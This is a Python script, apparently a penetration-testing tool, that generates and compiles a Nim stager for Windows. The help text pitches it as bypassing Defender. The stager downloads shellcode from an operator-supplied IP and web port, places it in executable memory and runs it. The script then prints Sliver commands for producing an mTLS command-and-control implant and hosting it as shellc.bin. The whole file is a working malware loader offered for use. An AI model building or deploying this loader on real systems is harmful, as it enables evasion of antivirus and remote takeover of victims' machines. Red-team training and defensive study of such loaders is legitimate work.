import argparse
import subprocess
import shutil
import sys
import os

# The Nim source code template with placeholders for the IP and Port
NIM_TEMPLATE = """
import winim/lean
import httpclient

func toByteSeq*(str: string): seq[byte] {{.inline.}} =
  @(str.toOpenArrayByte(0, str.high))

proc DownloadExecute(url: string): void =
  var client = newHttpClient()
  var response: string = client.getContent(url)

  var shellcode: seq[byte] = toByteSeq(response)
  let tProcess = GetCurrentProcessId()
  var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess)
  defer: CloseHandle(pHandle)

  let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](len(shellcode)), 0x3000, PAGE_EXECUTE_READ_WRITE)
  copyMem(rPtr, addr shellcode[0], len(shellcode))

  let f = cast[proc() {{.nimcall.}}](rPtr)
  f()

when defined(windows):
  when isMainModule:
    DownloadExecute("http://{ip}:{webport}/shellc.bin")
"""

def run_cmd(cmd, description):
    """Helper to run system commands and handle errors."""
    print(f"[*] {description}...")
    try:
        subprocess.run(cmd, shell=True, check=True, capture_output=False)
    except subprocess.CalledProcessError:
        print(f"[!] Error during: {description}")
        sys.exit(1)

def check_dependencies():
    """Checks for required binaries and installs them if missing."""
    dependencies = {
        "x86_64-w64-mingw32-gcc": "sudo apt update && sudo apt install -y mingw-w64",
        "nim": "sudo apt update && sudo apt install -y nim"
    }

    for bin_name, install_cmd in dependencies.items():
        if shutil.which(bin_name):
            print(f"[+] {bin_name} is already installed.")
        else:
            print(f"[!] {bin_name} not found.")
            run_cmd(install_cmd, f"Installing {bin_name}")

def main():
    # Adding Author and Site info to the Help menu
    help_text = (
        "Bypass Defender Automagically\n"
        "Author: Tyler Ramsbey\n"
        "Learn ethical hacking @ hacksmarter.org"
    )
    
    parser = argparse.ArgumentParser(
        description=help_text,
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument("-l", "--ip", required=True, help="The listener IP address")
    parser.add_argument("-p", "--port", required=True, help="The listener port")
    parser.add_argument("-w", "--webport", required=True, help="The web server port for serving shellcode")
    args = parser.parse_args()

    # 1. Generate the Nim source file
    print(f"[*] Formatting stager.nim for {args.ip}:{args.port} (web server on port {args.webport})...")
    try:
        with open("stager.nim", "w") as f:
            f.write(NIM_TEMPLATE.format(ip=args.ip, port=args.port, webport=args.webport))
    except Exception as e:
        print(f"[!] Failed to write file: {e}")
        sys.exit(1)

    # 2. Check and Install Environment Pre-reqs
    check_dependencies()

    # 3. Install Nim Library
    run_cmd("nimble install -y winim", "Installing winim library")

    # 4. Compile the Stager
    compile_command = (
        "nim c -d:mingw --os:windows "
        "--cpu:amd64 "
        "--cc:gcc "
        "--gcc.exe:x86_64-w64-mingw32-gcc "
        "--gcc.linkerexe:x86_64-w64-mingw32-gcc "
        "stager.nim"
    )
    run_cmd(compile_command, "Compiling stager.nim to Windows EXE")

    # Final Output and Sliver Reminder
    if os.path.exists("stager.exe"):
        print("\n" + "="*60)
        print("[SUCCESS] stager.exe has been generated!")
        print("="*60)
        print("\n[!] REMINDER: You must now generate the shellcode using Sliver.")
        print("    Run the following command in your Sliver console:\n")
        
        sliver_cmd = f"generate --mtls {args.ip}:{args.port} --os windows --arch amd64 --format shellcode"
        print(f"    {sliver_cmd}")
        
        print("\n[!] After generating, ensure the file is named 'shellc.bin' and")
        print(f"    hosted at http://{args.ip}:{args.webport}/shellc.bin")
        print(f"\n[!] Listener Configuration:")
        print(f"    - Listener IP: {args.ip}")
        print(f"    - Listener Port: {args.port}")
        print(f"    - Web Server Port (shellcode): {args.webport}")
        print("="*60 + "\n")
    else:
        print("\n[!] Build failed: stager.exe was not produced.")

if __name__ == "__main__":
    main()
